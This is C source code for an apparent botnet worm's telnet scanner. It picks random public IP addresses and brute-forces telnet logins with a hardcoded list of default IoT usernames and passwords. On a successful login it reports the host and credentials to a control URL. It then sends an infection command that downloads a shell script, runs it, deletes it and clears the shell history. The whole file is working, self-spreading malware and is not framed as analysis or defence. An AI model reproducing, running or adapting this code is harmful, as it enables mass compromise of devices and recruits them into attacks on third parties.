#include "../includes/px_botnet.h"

char *usernames[] = {
    "root\0", "administrator\0", "NetLinx\0", "amx\0", "admin\0",
    "Administrator\0", "cisco\0", "c-comatic\0", "pi\0", "user\0",
    "leo\0", "localadmin\0", "fwupgrade\0", "apc\0", "device\0",
    "eurek\0", "netscreen\0", "cirros\0", "vagrant\0", "m202\0",
    "demo\0", "maint\0", "debian\0", "myshake\0", "stackato\0",
    "default\0", "ftp\0", "nexthink\0", "ubnt\0", "sansforensics\0",
    "elk_user\0", "osboxes\0", "sans\0", "user\0", "misp\0",
    "hxeadm\0", "acitoolkit\0", "osbash\0", "enisa\0", "geosolutions\0",
    "pyimagesearch\0", "remnux\0", "hunter\0", "plexuser\0", "openhabian\0",
    "public\0", "hipchat\0", "nao\0", "support\0", "USERID\0",
    "Administrator\0", "admin1\0", "administrator\0", "666666\0", "888888\0",
    "tech\0", "guest\0", "login\0", "password\0", "telnet\0",
    "88888888\0", "klv1234\0", "hi3518\0", "jvbzd\0", "ikwb\0",
    "dreambox\0", "realtek\0", "00000000\0", "54321\0", "123456\0",
    "S2fGqNFs\0", "OxhlwSG8\0", "antslq\0", "tlJwpbo6\0", "taZz@23495859\0",
    "20080826\0", "gforge\0", "zsun1188\0", "synnet\0", "t0talc0ntr0l4!\0",
    "fliradmin\0", "12345678\0", "1234567890\0", "vertex25ektks123\0", "admin@mymifi\0",
    "meinsm\0", "cat1029\0"
};
char *passwords[] = {
    "calvin\0", "password\0", "Amx1234!\0", "1988\0", "Vision2\0",
    "insecure\0", "raspberry\0", "default\0", "rootpasswd\0", "p@ck3tf3nc3\0",
    "12345\0", "cubswin\0", "ucLinux\0", "alpine\0", "dottie\0",
    "arcsight\0", "unitrends1\0", "vagrant\0", "fai\0", "palosanto\0",
    "ubuntu1404\0", "cubox-i\0", "sipwise\0", "screencast\0", "stxadmin\0",
    "nosoup4u\0", "indigo\0", "video\0", "ubnt\0", "forensics\0",
    "osboxes.org\0", "training\0", "Password1234\0", "HXEHana1\0", "osbash\0",
    "enisa\0", "Geos\0", "deeplearning\0", "malware\0", "rasplex\0",
    "plex\0", "openmediavault\0", "ys123456\0", "libreelec\0", "ManagementConsole2015\0",
    "publicpass\0", "symantec\0", "max2play\0", "pfsense\0", "root01\0",
    "nas4free\0", "PASSW0RD\0", "p@ssw0rd\0", "freenas\0", "cxlinux\0",
    "symbol\0", "superuser\0", "admin123\0", "D13HH[\0", "blackarch\0",
    "dasdec1\0", "7ujMko0vizxv\0", "Zte521\0", "zlxx.\0", "compass\0",
    "samurai\0", "ubuntu\0", "openvpnas\0", "wazuh\0", "password123\0",
    "reverse\0", "PrOw!aN_fXp\0", "usuario\0", "admin1234\0", "vizxv\0",
    "anko\0", "supervisor\0", "1234567\0", "1234\0", "12345\0",
    "pass\0", "changeme\0", "volatilechangeme123\0"
};

int sclose(int fd)
{
	if (3 > fd)
		return 1;
	close(fd);
	return 0;
}

int matchPrompt(char *bufStr)
{
	char *prompts = ":>%$#\0";

	int bufLen = strlen(bufStr);
	int i, q = 0;
	for (i = 0; i < strlen(prompts); i++)
	{
		while (bufLen > q && (*(bufStr + bufLen - q) == 0x00 || *(bufStr + bufLen - q) == ' ' || *(bufStr + bufLen - q) == '\r' || *(bufStr + bufLen - q) == '\n'))
			q++;
		if (*(bufStr + bufLen - q) == prompts[i])
			return 1;
	}

	return 0;
}

int negotiate(int sock, unsigned char *buf, int len)
{
	unsigned char c;

	switch (buf[1])
	{
	case CMD_IAC: /*dropped an extra 0xFF wh00ps*/
		return 0;
	case CMD_WILL:
	case CMD_WONT:
	case CMD_DO:
	case CMD_DONT:
		c = CMD_IAC;
		send(sock, &c, 1, MSG_NOSIGNAL);
		if (CMD_WONT == buf[1])
			c = CMD_DONT;
		else if (CMD_DONT == buf[1])
			c = CMD_WONT;
		else if (OPT_SGA == buf[1])
			c = (buf[1] == CMD_DO ? CMD_WILL : CMD_DO);
		else
			c = (buf[1] == CMD_DO ? CMD_WONT : CMD_DONT);
		send(sock, &c, 1, MSG_NOSIGNAL);
		send(sock, &(buf[2]), 1, MSG_NOSIGNAL);
		break;

	default:
		break;
	}

	return 0;
}

int readUntil(int fd, char *toFind, int matchLePrompt, int timeout, int timeoutusec, char *buffer, int bufSize, int initialIndex)
{
	int bufferUsed = initialIndex, got = 0, found = 0;
	fd_set myset;
	struct timeval tv;
	tv.tv_sec = timeout;
	tv.tv_usec = timeoutusec;
	unsigned char *initialRead = NULL;

	while (bufferUsed + 2 < bufSize && (tv.tv_sec > 0 || tv.tv_usec > 0))
	{
		FD_ZERO(&myset);
		FD_SET(fd, &myset);
		if (select(fd + 1, &myset, NULL, NULL, &tv) < 1)
			break;
		initialRead = buffer + bufferUsed;
		got = recv(fd, initialRead, 1, 0);
		if (got == -1 || got == 0)
			return 0;
		bufferUsed += got;
		if (*initialRead == 0xFF)
		{
			got = recv(fd, initialRead + 1, 2, 0);
			if (got == -1 || got == 0)
				return 0;
			bufferUsed += got;
			if (!negotiate(fd, initialRead, 3))
				return 0;
		}
		else
		{
			if (strstr(buffer, toFind) != NULL || (matchLePrompt && matchPrompt(buffer)))
			{
				found = 1;
				break;
			}
		}
	}

	if (found)
		return 1;
	return 0;
}

in_addr_t getRandomPublicIP()
{
	uint8_t ipState[4] = {0};
	ipState[0] = rand() % 255;
	ipState[1] = rand() % 255;
	ipState[2] = rand() % 255;
	ipState[3] = rand() % 255;
	while ((ipState[0] == 0) || (ipState[0] == 10) || (ipState[0] == 100 && (ipState[1] >= 64 && ipState[1] <= 127)) || (ipState[0] == 127) || (ipState[0] == 169 && ipState[1] == 254) || (ipState[0] == 172 && (ipState[1] <= 16 && ipState[1] <= 31)) || (ipState[0] == 192 && ipState[1] == 0 && ipState[2] == 2) || (ipState[0] == 192 && ipState[1] == 88 && ipState[2] == 99) || (ipState[0] == 192 && ipState[1] == 168) || (ipState[0] == 198 && (ipState[1] == 18 || ipState[1] == 19)) || (ipState[0] == 198 && ipState[1] == 51 && ipState[2] == 100) || (ipState[0] == 203 && ipState[1] == 0 && ipState[2] == 113) || (ipState[0] >= 224))
	{
		ipState[0] = rand() % 255;
		ipState[1] = rand() % 255;
		ipState[2] = rand() % 255;
		ipState[3] = rand() % 255;
	}
	char ip[16] = {0};
	sprintf(ip, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
	return inet_addr(ip);
}

void ft_scan_world(void) // verif si work tjr
{
	char *infectline;
	infectline = strdup("cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget -O wget.sh ");
	infectline = ft_strnjoin(infectline, download_url, ft_strlen(download_url));
	infectline = ft_strnjoin(infectline, "; chmod +x wget.sh; sh wget.sh; rm wget.sh; history -c\r\n", 57);
	int max = (getdtablesize() / 4) * 3, i, res;
	fd_set myset;
	struct timeval tv;
	socklen_t lon;
	int valopt;

	max = max > 320 ? 320 : max;

	struct sockaddr_in dest_addr;
	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(23);
	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

	struct telstate_t
	{
		int fd;
		uint32_t ip;
		uint8_t state;
		uint8_t complete;
		uint8_t usernameInd;
		uint8_t passwordInd;
		uint32_t totalTimeout;
		uint16_t bufUsed;
		char *sockbuf;
	} fds[max + 1024];
	memset(fds, 0, max * (sizeof(int) + 1));
	for (i = 0; i < max; i++)
	{
		fds[i].complete = 1;
		fds[i].sockbuf = malloc(1024);
		memset(fds[i].sockbuf, 0, 1024);
	}
	struct timeval timeout;
	timeout.tv_sec = 5;
	timeout.tv_usec = 0;
	while (1)
	{
		//sleep(5);
		for (i = 0; i < max; i++)
		{
			switch (fds[i].state)
			{
			case 0:
			{
				memset(fds[i].sockbuf, 0, 1024);

				if (fds[i].complete)
				{
					char *tmp = fds[i].sockbuf;
					memset(&(fds[i]), 0, sizeof(struct telstate_t));
					fds[i].sockbuf = tmp;
					fds[i].ip = getRandomPublicIP();
				}
				else
				{
					fds[i].passwordInd++;
					if (fds[i].passwordInd == sizeof(passwords) / sizeof(char *))
					{
						fds[i].passwordInd = 0;
						fds[i].usernameInd++;
					}
					if (fds[i].usernameInd == sizeof(usernames) / sizeof(char *))
					{
						fds[i].complete = 1;
						continue;
					}
				}
				dest_addr.sin_family = AF_INET;
				dest_addr.sin_port = htons(23);
				memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
				dest_addr.sin_addr.s_addr = fds[i].ip;
				fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
				setsockopt(fds[i].fd, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
				setsockopt(fds[i].fd, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
				if (fds[i].fd == -1)
				{
					continue;
				}
				fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
				if (connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) == -1 && errno != EINPROGRESS)
				{ /*printf("close %lu\n",fds[i].ip);*/
					sclose(fds[i].fd);
					fds[i].complete = 1;
				}
				else
				{
					fds[i].state = 1;
					fds[i].totalTimeout = 0;
				}
			}
			break;

			case 1:
			{
				if (fds[i].totalTimeout == 0)
					fds[i].totalTimeout = time(NULL);

				FD_ZERO(&myset);
				FD_SET(fds[i].fd, &myset);
				tv.tv_sec = 0;
				tv.tv_usec = 10000;
				res = select(fds[i].fd + 1, NULL, &myset, NULL, &tv);
				if (res == 1)
				{
					lon = sizeof(int);
					valopt = 0;
					getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void *)(&valopt), &lon);
					if (valopt)
					{
						sclose(fds[i].fd);
						fds[i].state = 0;
						fds[i].complete = 1;
					}
					else
					{
						fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) & (~O_NONBLOCK));
						fds[i].totalTimeout = 0;
						fds[i].bufUsed = 0;
						memset(fds[i].sockbuf, 0, 1024);
						fds[i].state = 2;
						continue;
					}
				}
				else if (res == -1)
				{
					sclose(fds[i].fd);
					fds[i].state = 0;
					fds[i].complete = 1;
				}

				if (fds[i].totalTimeout + 5 < time(NULL)) // was if(fds[i].totalTimeout + 5 < time(NULL))
				{
					sclose(fds[i].fd);
					fds[i].state = 0;
					fds[i].complete = 1;
				}
			}
			break;

			case 2:
			{
				if (fds[i].totalTimeout == 0)
					fds[i].totalTimeout = time(NULL);
				if (matchPrompt(fds[i].sockbuf))
				{
					fds[i].state = 7;
				}

				if (readUntil(fds[i].fd, "ogin:", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
				{
					fds[i].totalTimeout = 0;
					fds[i].bufUsed = 0;
					memset(fds[i].sockbuf, 0, 1024);
					fds[i].state = 3;
					continue;
				}
				else
				{
					fds[i].bufUsed = strlen(fds[i].sockbuf);
				}

				if (fds[i].totalTimeout + 30 < time(NULL))
				{
					sclose(fds[i].fd);
					fds[i].state = 0;
					fds[i].complete = 1;
				}
			}
			break;

			case 3:
			{
				if (send(fds[i].fd, usernames[fds[i].usernameInd], strlen(usernames[fds[i].usernameInd]), MSG_NOSIGNAL) < 0)
				{
					sclose(fds[i].fd);
					fds[i].state = 0;
					fds[i].complete = 1;
					continue;
				}
				if (send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0)
				{
					sclose(fds[i].fd);
					fds[i].state = 0;
					fds[i].complete = 1;
					continue;
				}
				fds[i].state = 4;
			}
			break;

			case 4:
			{
				if (fds[i].totalTimeout == 0)
					fds[i].totalTimeout = time(NULL);

				if (readUntil(fds[i].fd, "assword:", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
				{
					fds[i].totalTimeout = 0;
					fds[i].bufUsed = 0;
					if (strstr(fds[i].sockbuf, "assword:") != NULL)
						fds[i].state = 5;
					else
						fds[i].state = 7;
					memset(fds[i].sockbuf, 0, 1024);
					continue;
				}
				else
				{
					if (strstr(fds[i].sockbuf, "ncorrect") != NULL)
					{
						sclose(fds[i].fd);
						fds[i].state = 0;
						fds[i].complete = 0;
						continue;
					}
					fds[i].bufUsed = strlen(fds[i].sockbuf);
				}

				if (fds[i].totalTimeout + 8 < time(NULL)) // was if(fds[i].totalTimeout + 8 < time(NULL))
				{
					sclose(fds[i].fd);
					fds[i].state = 0;
					fds[i].complete = 1;
				}
			}
			break;

			case 5:
			{
				if (send(fds[i].fd, passwords[fds[i].passwordInd], strlen(passwords[fds[i].passwordInd]), MSG_NOSIGNAL) < 0)
				{
					sclose(fds[i].fd);
					fds[i].state = 0;
					fds[i].complete = 1;
					continue;
				}
				if (send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0)
				{
					sclose(fds[i].fd);
					fds[i].state = 0;
					fds[i].complete = 1;
					continue;
				}
				fds[i].state = 6;
			}
			break;

			case 6:
			{
				if (fds[i].totalTimeout == 0)
					fds[i].totalTimeout = time(NULL);

				if (readUntil(fds[i].fd, "ncorrect", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
				{
					fds[i].totalTimeout = 0;
					fds[i].bufUsed = 0;
					if (strstr(fds[i].sockbuf, "ncorrect") != NULL)
					{
						memset(fds[i].sockbuf, 0, 1024);
						sclose(fds[i].fd);
						fds[i].state = 0;
						fds[i].complete = 0;
						continue;
					}
					if (!matchPrompt(fds[i].sockbuf))
					{
						memset(fds[i].sockbuf, 0, 1024);
						sclose(fds[i].fd);
						fds[i].state = 0;
						fds[i].complete = 1;
						continue;
					}
					else
						fds[i].state = 7;
					memset(fds[i].sockbuf, 0, 1024);
					continue;
				}
				else
				{
					fds[i].bufUsed = strlen(fds[i].sockbuf);
				}

				if (fds[i].totalTimeout + 30 < time(NULL))
				{
					sclose(fds[i].fd);
					fds[i].state = 0;
					fds[i].complete = 1;
				}
			}
			break;

			case 7:
			{
				if (send(fds[i].fd, "sh\r\n", 4, MSG_NOSIGNAL) < 0)
				{
					sclose(fds[i].fd);
					fds[i].state = 0;
					fds[i].complete = 1;
					continue;
				}
				char *tmpz, *tmp_return, *ip;
				ip = inet_ntoa(*(struct in_addr *)&(fds[i].ip));
				tmpz = ft_strjoin(ip, ":");
				tmpz = ft_strnjoin(tmpz, usernames[fds[i].usernameInd], strlen(usernames[fds[i].usernameInd]));
				tmpz = ft_strnjoin(tmpz, ":", 1);
				tmpz = ft_strnjoin(tmpz, passwords[fds[i].passwordInd], strlen(passwords[fds[i].passwordInd]));
				tmpz = ft_strnjoinf("?vuln_found=", tmpz, strlen(tmpz));
				tmpz = ft_strnjoinf(url_page, tmpz, strlen(tmpz));
				tmp_return = ft_request(tmpz);
				free(tmp_return);
				free(tmpz);
				fds[i].state = 8;
			}
			break;

			case 8:
			{
				if (fds[i].totalTimeout == 0)
					fds[i].totalTimeout = time(NULL);

				if (send(fds[i].fd, infectline, strlen(infectline), MSG_NOSIGNAL) < 0)
				{
					sclose(fds[i].fd);
					fds[i].state = 0;
					fds[i].complete = 1;
					memset(fds[i].sockbuf, 0, 1024);
					continue;
				}
				if (fds[i].totalTimeout + 8 < time(NULL))
				{
					sclose(fds[i].fd);
					fds[i].state = 0;
					fds[i].complete = 1;
				}
			}
			break;
			}
		}
	}
}
